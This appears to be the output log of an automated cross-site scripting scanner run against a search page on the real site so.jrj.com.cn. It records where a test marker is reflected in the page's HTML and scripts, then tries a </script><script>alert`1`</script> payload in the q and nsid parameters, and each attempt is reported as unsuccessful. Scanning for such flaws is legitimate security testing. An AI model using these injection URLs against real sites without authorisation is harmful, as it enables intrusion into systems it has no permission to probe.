@@ -1,0 +1,454 @@
+http://so.jrj.com.cn/cse/search?q=&s=5981575158355482147&nsid=1
+
+GET Params:[3]
+['q', 's', 'nsid']
+_______________________________________________________________________________________________________
+http://so.jrj.com.cn/cse/search?q=abc/uvw"xyz'yxz<zxy&s=5981575158355482147&nsid=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<input name="q" id="kw" class="s_ipt" value="abc/uvw&quot;xyz&#039;yxz&lt;zxy" maxlength="100"
+                           autocomplete="off" style="">
+<input name="q" id="kw2" class="s_ipt" value="abc/uvw&quot;xyz&#039;yxz&lt;zxy" maxlength="100" autocomplete="off" style="">
+<input type="hidden" name="q" value="abc/uvw&quot;xyz&#039;yxz&lt;zxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<em>XYz</em>
+
+----------------------------------------------------------------------------------
+Script Context: [2]
+<script>
+            //æå¨ç½åè½
+			function baidusearch(id){
+				var url = "http://www.baidu.com/s?ie=utf-8&cus_sid=5981575158355482147&tn=SE_pscse_053x7tyx&wd=" + encodeURIComponent(document.getElementById(id).value);
+				window.open(url,"_blank");
+                var bpos;
+                if (id === "kw") {
+                    bpos = "top";
+                }
+                else {
+                    bpos = "bottom";
+                }
+                var pageLog = {};
+                                    pageLog["q"] = "abc/uvw\"xyz\'yxz<zxy";
+                                    pageLog["s"] = "5981575158355482147";
+                                    pageLog["nsid"] = "1";
+                                    pageLog["isNeedCheckDomain"] = "1";
+                                log.send("/api/customsearch/click", pageLog, {
+                    bpos: bpos,
+                    tid: "0",
+                    cc: 'jrj.com.cn',
+                    rt: 1
+                });
+			}
+		</script>
+<script>
+		var cse = cse || {};		
+		cse.param = {
+			'filters' : [] || {},
+			'sorts' : "" || "",
+			'searchType' : 0 || "",
+			'searchTimeRange' : 0 || "",
+			'nsid': "1",
+			'inurl':null || "",
+            'cid':null || "",
+            'wt': null || "",
+            'ht': null || "",
+            'pn': null || ""
+		};		
+		cse.util = {
+			'makeParam' : function(arr){
+				var sb = [];
+				for(var key in arr){
+					if (arr[key] && typeof(arr[key])!="function"){
+						sb.push(key+"="+encodeURIComponent(arr[key]));
+					}
+				}
+				return sb.join("&");
+			},
+			'addParam' : function(dom,key,value){
+				if(dom && key && value){
+					var ipt = document.createElement("input");
+					ipt.type = "hidden";
+					ipt.name = key;
+					ipt.value = value;
+					dom.appendChild(ipt);
+				}
+			},				
+			'select' : function(k,v,action){				
+				if (action == "filter") {
+					cse.param.filters[k] = v;
+				}else if(action == "sort") {
+					cse.param.sorts = v;
+				}else if(action == "type") {
+					cse.param.searchType = v;
+				}else if(action == "time") {
+					cse.param.searchTimeRange = v;
+				}
+				var filterValue = cse.util.makeParam(cse.param.filters);
+				var f3 = document.getElementById("f3");
+				cse.util.addParam(f3,"flt",filterValue);
+				cse.util.addParam(f3,"srt",cse.param.sorts);
+				cse.util.addParam(f3,"stp",cse.param.searchType);
+				cse.util.addParam(f3,"sti",cse.param.searchTimeRange);
+				cse.util.addParam(f3,"nsid",cse.param.nsid);
+				cse.util.addParam(f3,"inurl",cse.param.inurl);
+                cse.util.addParam(f3,"cid",cse.param.cid);
+                cse.util.addParam(f3,"wt",cse.param.wt);
+                cse.util.addParam(f3,"ht",cse.param.ht);
+                cse.util.addParam(f3,"pn",cse.param.pn);
+								f3.submit();
+			},
+			'switchFilter':function(obj){
+				var id = obj.getAttribute("data-for"),
+					exp = (obj.getAttribute("data-exp")=="0"),
+					con = document.getElementById("flt-"+id),
+					flts = con.getElementsByTagName("DD");
+				for (var i=0,len=flts.length;i<len;i++){
+				var flt = flts[i];
+					if (exp) {
+						flt.style.display = "block";
+					}else {
+						if (flt.getAttribute("data-limit")=="1"){
+							flt.style.display = "none";
+						}
+					}	
+				}
+				obj.setAttribute("data-exp",exp?"1":"0");
+				obj.className = exp?"filterLimitExp":"filterLimit";
+			}
+		};
+
+        function calcPageHeight(doc) {
+            var cHeight = Math.max(doc.body.clientHeight, doc.documentElement.clientHeight);
+            var sHeight = Math.max(doc.body.scrollHeight, doc.documentElement.scrollHeight);
+            var height  = Math.max(cHeight, sHeight);
+            return height.toString();
+        };
+
+		window.onload = function(){
+            document.forms[0].reset();
+            document.forms[document.forms.length-1].reset();
+            if (top && top.location !== self.location) {
+                if ((navigator.appName == "Microsoft Internet Explorer" && navigator.appVersion .split(";")[1].replace(/[ ]/g,"")=="MSIE7.0") ||
+                        (navigator.appName == "Microsoft Internet Explorer" && navigator.appVersion .split(";")[1].replace(/[ ]/g,"")=="MSIE6.0")) {
+                    if (top.name) {
+                        top.name = calcPageHeight(document);
+                    }
+                }
+                else {
+                    if (top.postMessage) {
+                        window.attachEvent ? window.attachEvent('onmessage', function (event) {
+                            top.postMessage(calcPageHeight(document), '*');
+                        }) : window.addEventListener('message', function (event) {
+                            top.postMessage(calcPageHeight(document), '*');
+                        }, false);
+                        top.postMessage(0, '*');
+                    }
+                    else if (top.name) {
+                        top.name = calcPageHeight(document);
+                    }
+                }
+            }
+
+            if ($('.iframe-result').length > 0) {
+                var pageLog = {};
+                log.send("/api/customsearch/click", pageLog, {
+                    logType: 'framerec-show',
+                    queryType: '',
+                    resultNum: $('.iframe-result').length,
+                    imgNum: $('.iframe-image').length,
+                    q: 'abc/uvw\"xyz\'yxz<zxy'
+                });
+            }
+        };
+        $('.iframe-result a').on('click', function () {
+            var pageLog = {};
+            log.send("/api/customsearch/click", pageLog, {
+                logType: 'framerec-click',
+                queryType: '',
+                hasImg: $(this).parents('.iframe-result').find('.iframe-image').length > 0 ? 1 : 0,
+                q: 'abc/uvw\"xyz\'yxz<zxy'
+            });
+        });
+        $('.iframe-container').ready(function () {
+            if ($('.iframe-content-image').length > 0) {
+                $('.iframe-content-image').width($('.iframe-container').width() - 122);
+            }
+        });
+        $(".result a").click(function () {
+            var pageLog = {};
+                            pageLog["q"] = "abc/uvw\"xyz\'yxz<zxy";
+                            pageLog["s"] = "5981575158355482147";
+                            pageLog["nsid"] = "1";
+                            pageLog["isNeedCheckDomain"] = "1";
+                        log.send("/api/customsearch/click", pageLog, {
+                rpos: parseInt($(this).parents(".result").index(".result"))+1,
+                uid: encodeURIComponent($(this).attr("href")),
+                tid: "0",
+                cpos: $(this).attr("cpos"),
+                cc: 'jrj.com.cn',
+                from: 'normal'
+            });
+        });
+	</script>
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a href="search?q=abc/uvw&quot;xyz&#039;yxz&lt;zxy&s=5981575158355482147&nsid=2&">
+<a href="search?q=abc/uvw&quot;xyz&#039;yxz&lt;zxy&s=5981575158355482147&nsid=3&">
+
+----------------------------------------------------------------------------------
+
+
+Attack Payloads for SCRIPT
+['</script><script>alert`1`</script>']
+
+SCRIPT Attack Url: http://so.jrj.com.cn/cse/search?q=</script><script>alert`1`</script>&s=5981575158355482147&nsid=1
+
+ ______Detection  UnSuccessful with payload: </script><script>alert`1`</script>
+
+
+Attack Payloads for SCRIPT
+['</script><script>alert`1`</script>']
+
+SCRIPT Attack Url: http://so.jrj.com.cn/cse/search?q=</script><script>alert`1`</script>&s=5981575158355482147&nsid=1
+
+ ______Detection  UnSuccessful with payload: </script><script>alert`1`</script>
+
+_______________________________________________________________________________________________________
+http://so.jrj.com.cn/cse/search?q=&s=abc/uvw"xyz'yxz<zxy&nsid=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+_______________________________________________________________________________________________________
+http://so.jrj.com.cn/cse/search?q=&s=5981575158355482147&nsid=abc/uvw"xyz'yxz<zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [2]
+<script>
+            //æå¨ç½åè½
+			function baidusearch(id){
+				var url = "http://www.baidu.com/s?ie=utf-8&cus_sid=5981575158355482147&tn=SE_pscse_053x7tyx&wd=" + encodeURIComponent(document.getElementById(id).value);
+				window.open(url,"_blank");
+                var bpos;
+                if (id === "kw") {
+                    bpos = "top";
+                }
+                else {
+                    bpos = "bottom";
+                }
+                var pageLog = {};
+                                    pageLog["q"] = "";
+                                    pageLog["s"] = "5981575158355482147";
+                                    pageLog["nsid"] = "abc/uvw\"xyz\'yxz<zxy";
+                                    pageLog["isNeedCheckDomain"] = "1";
+                                log.send("/api/customsearch/click", pageLog, {
+                    bpos: bpos,
+                    tid: "0",
+                    cc: 'jrj.com.cn',
+                    rt: 1
+                });
+			}
+		</script>
+<script>
+		var cse = cse || {};		
+		cse.param = {
+			'filters' : [] || {},
+			'sorts' : "" || "",
+			'searchType' : 0 || "",
+			'searchTimeRange' : 0 || "",
+			'nsid': "0",
+			'inurl':null || "",
+            'cid':null || "",
+            'wt': null || "",
+            'ht': null || "",
+            'pn': null || ""
+		};		
+		cse.util = {
+			'makeParam' : function(arr){
+				var sb = [];
+				for(var key in arr){
+					if (arr[key] && typeof(arr[key])!="function"){
+						sb.push(key+"="+encodeURIComponent(arr[key]));
+					}
+				}
+				return sb.join("&");
+			},
+			'addParam' : function(dom,key,value){
+				if(dom && key && value){
+					var ipt = document.createElement("input");
+					ipt.type = "hidden";
+					ipt.name = key;
+					ipt.value = value;
+					dom.appendChild(ipt);
+				}
+			},				
+			'select' : function(k,v,action){				
+				if (action == "filter") {
+					cse.param.filters[k] = v;
+				}else if(action == "sort") {
+					cse.param.sorts = v;
+				}else if(action == "type") {
+					cse.param.searchType = v;
+				}else if(action == "time") {
+					cse.param.searchTimeRange = v;
+				}
+				var filterValue = cse.util.makeParam(cse.param.filters);
+				var f3 = document.getElementById("f3");
+				cse.util.addParam(f3,"flt",filterValue);
+				cse.util.addParam(f3,"srt",cse.param.sorts);
+				cse.util.addParam(f3,"stp",cse.param.searchType);
+				cse.util.addParam(f3,"sti",cse.param.searchTimeRange);
+				cse.util.addParam(f3,"nsid",cse.param.nsid);
+				cse.util.addParam(f3,"inurl",cse.param.inurl);
+                cse.util.addParam(f3,"cid",cse.param.cid);
+                cse.util.addParam(f3,"wt",cse.param.wt);
+                cse.util.addParam(f3,"ht",cse.param.ht);
+                cse.util.addParam(f3,"pn",cse.param.pn);
+								f3.submit();
+			},
+			'switchFilter':function(obj){
+				var id = obj.getAttribute("data-for"),
+					exp = (obj.getAttribute("data-exp")=="0"),
+					con = document.getElementById("flt-"+id),
+					flts = con.getElementsByTagName("DD");
+				for (var i=0,len=flts.length;i<len;i++){
+				var flt = flts[i];
+					if (exp) {
+						flt.style.display = "block";
+					}else {
+						if (flt.getAttribute("data-limit")=="1"){
+							flt.style.display = "none";
+						}
+					}	
+				}
+				obj.setAttribute("data-exp",exp?"1":"0");
+				obj.className = exp?"filterLimitExp":"filterLimit";
+			}
+		};
+
+        function calcPageHeight(doc) {
+            var cHeight = Math.max(doc.body.clientHeight, doc.documentElement.clientHeight);
+            var sHeight = Math.max(doc.body.scrollHeight, doc.documentElement.scrollHeight);
+            var height  = Math.max(cHeight, sHeight);
+            return height.toString();
+        };
+
+		window.onload = function(){
+            document.forms[0].reset();
+            document.forms[document.forms.length-1].reset();
+            if (top && top.location !== self.location) {
+                if ((navigator.appName == "Microsoft Internet Explorer" && navigator.appVersion .split(";")[1].replace(/[ ]/g,"")=="MSIE7.0") ||
+                        (navigator.appName == "Microsoft Internet Explorer" && navigator.appVersion .split(";")[1].replace(/[ ]/g,"")=="MSIE6.0")) {
+                    if (top.name) {
+                        top.name = calcPageHeight(document);
+                    }
+                }
+                else {
+                    if (top.postMessage) {
+                        window.attachEvent ? window.attachEvent('onmessage', function (event) {
+                            top.postMessage(calcPageHeight(document), '*');
+                        }) : window.addEventListener('message', function (event) {
+                            top.postMessage(calcPageHeight(document), '*');
+                        }, false);
+                        top.postMessage(0, '*');
+                    }
+                    else if (top.name) {
+                        top.name = calcPageHeight(document);
+                    }
+                }
+            }
+
+            if ($('.iframe-result').length > 0) {
+                var pageLog = {};
+                log.send("/api/customsearch/click", pageLog, {
+                    logType: 'framerec-show',
+                    queryType: '',
+                    resultNum: $('.iframe-result').length,
+                    imgNum: $('.iframe-image').length,
+                    q: ''
+                });
+            }
+        };
+        $('.iframe-result a').on('click', function () {
+            var pageLog = {};
+            log.send("/api/customsearch/click", pageLog, {
+                logType: 'framerec-click',
+                queryType: '',
+                hasImg: $(this).parents('.iframe-result').find('.iframe-image').length > 0 ? 1 : 0,
+                q: ''
+            });
+        });
+        $('.iframe-container').ready(function () {
+            if ($('.iframe-content-image').length > 0) {
+                $('.iframe-content-image').width($('.iframe-container').width() - 122);
+            }
+        });
+        $(".result a").click(function () {
+            var pageLog = {};
+                            pageLog["q"] = "";
+                            pageLog["s"] = "5981575158355482147";
+                            pageLog["nsid"] = "abc/uvw\"xyz\'yxz<zxy";
+                            pageLog["isNeedCheckDomain"] = "1";
+                        log.send("/api/customsearch/click", pageLog, {
+                rpos: parseInt($(this).parents(".result").index(".result"))+1,
+                uid: encodeURIComponent($(this).attr("href")),
+                tid: "0",
+                cpos: $(this).attr("cpos"),
+                cc: 'jrj.com.cn',
+                from: 'normal'
+            });
+        });
+	</script>
+
+----------------------------------------------------------------------------------
+URI Context: [10]
+<a href="search?q=&p=1&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=2&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=3&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=4&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=5&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=6&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=7&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=8&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=9&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy">
+<a href="search?q=&p=1&s=5981575158355482147&nsid=abc%2Fuvw%22xyz%27yxz%3Czxy" class="pager-next-foot n" >
+
+----------------------------------------------------------------------------------
+
+
+Attack Payloads for SCRIPT
+['</script><script>alert`1`</script>']
+
+SCRIPT Attack Url: http://so.jrj.com.cn/cse/search?q=&s=5981575158355482147&nsid=</script><script>alert`1`</script>
+
+ ______Detection  UnSuccessful with payload: </script><script>alert`1`</script>
+
+
+Attack Payloads for SCRIPT
+['</script><script>alert`1`</script>']
+
+SCRIPT Attack Url: http://so.jrj.com.cn/cse/search?q=&s=5981575158355482147&nsid=</script><script>alert`1`</script>
+
+ ______Detection  UnSuccessful with payload: </script><script>alert`1`</script>
+
